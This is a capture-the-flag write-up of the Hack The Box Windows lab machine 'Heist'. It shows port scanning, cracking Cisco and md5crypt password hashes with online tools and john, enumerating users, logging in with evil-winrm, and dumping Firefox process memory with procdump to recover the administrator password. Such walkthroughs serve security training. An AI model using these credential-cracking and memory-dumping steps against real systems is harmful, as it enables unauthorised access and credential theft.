---
title: Hack The Box - Heist Write Up
published: true
---
Hey Guys This is my write up about heist from hack the box 
This is an easy windows machine.
# [](#header-3)Machie ip:10.10.10.149
I added it to /etc/hosts
so let's get jump in 
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/heist.jpg)

# [](#header-2)Port Scan 
```
root@ch4n:~# nmap -sC -sV 10.10.10.149

Starting Nmap 7.60 ( https://nmap.org ) at 2019-11-02 15:18 EDT
Nmap scan report for 10.10.10.149
Host is up (0.43s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-11-02 04:50:41
|_  start_date: 1600-12-31 19:03:58

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.89 seconds
```
# [](#header-2)Web Page 
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/web%20page.png)

After logging in as guest I found this page
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/loggedin.png)

In this page The user Hazard posting the issue about cisco router and he attached the issue with configuration file

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/config.png)

In config.txt it contains some pass and username

I used online tools to crack them

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/cracked(1).png)
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/cracked(2).png)

```
0242114B0E143F015F5D1E161713 - $uperP@ssword
02375012182C1A1D751618034F36415408 - Q4)sJu\Y8qz*A3?d
```
this one can't crack by online tools so I used john
```
$1$pdQG$o8nrSzsGXeaduXrjlvKc91
```

```
root@ch4n:~/Desktop/htb/boxes/heist# john --wordlist=/root/Desktop/rockyou.txt hash.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)
1g 0:00:01:15 DONE (2019-12-26 15:08) 0.01316g/s 46153p/s 46153c/s 46153C/s stealthy001..steak7893
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
we got the pass 
```
stealth1agent
```

so we got users as 
```
admin
Hazard
administrator 
```

so Let's enumerate user through hazard 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/lookupsid.jpg)

here we got a bunch of usernames

So There are the users
```
Hazard
admin
administrator
support 
Chase 
Jason
Guest
```
Here are the pass

```
$uperP@ssword
Q4)sJu\Y8qz*A3?d 
stealth1agent
```
then I could login as Chase 
```
Chase - Q4)sJu\Y8qz*A3?d
```
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/chase.jpg)
then grab the user.txt

# [](#header-2)Privillege Escalation
I found this 
```
if( $_REQUEST['login_username'] === 'admin@support.htb' && hash( 'sha256', $_REQUEST['login_password']) === '91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040') 
```
in 
```
C:\inetpub\wwwroot\login.php 
```

I crack the pass with online tools 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/cracked(3).png)

```
https://md5hashing.net/hash/sha256/91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040
4dD!5}x/re8]FBuZ
```
got the password 

```
4dD!5}x/re8]FBuZ
``` 
and login with evil-winrm

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/root.jpg)

and got the shell as system user and grab the root flag

There is another way to get root so I wanna explain about it 

let's go on

I check the services with ps cmd 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/ps.png)

then I saw that firefox is running 

so I used procdump to dump all the data from firefox

You can download from there:[https://docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/procdump.png)

I just download the dmp file from attack  machine to my machine then grep the pass with strings 

![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/strings.png)
 
then got the root pass 
![](https://raw.githubusercontent.com/Cnw311/hack-the-box/gh-pages/assets/root_pass.jpg)
```
4dD!5}x/re8]FBuZ
```
So This is another way to get the root pass.

That’s it , Feedback is appreciated !

Contact me on 
[Facebook](https://www.facebook.com/SeeKwalCH4N)
[Twitter](https://twitter.com/ChanNyeinWai6)
[Instagram](https://www.instagram.com/chan_nyeinwai/)

Thanks for reading.
<img src="https://www.hackthebox.eu/badge/image/81292" alt="Hack The Box"> 

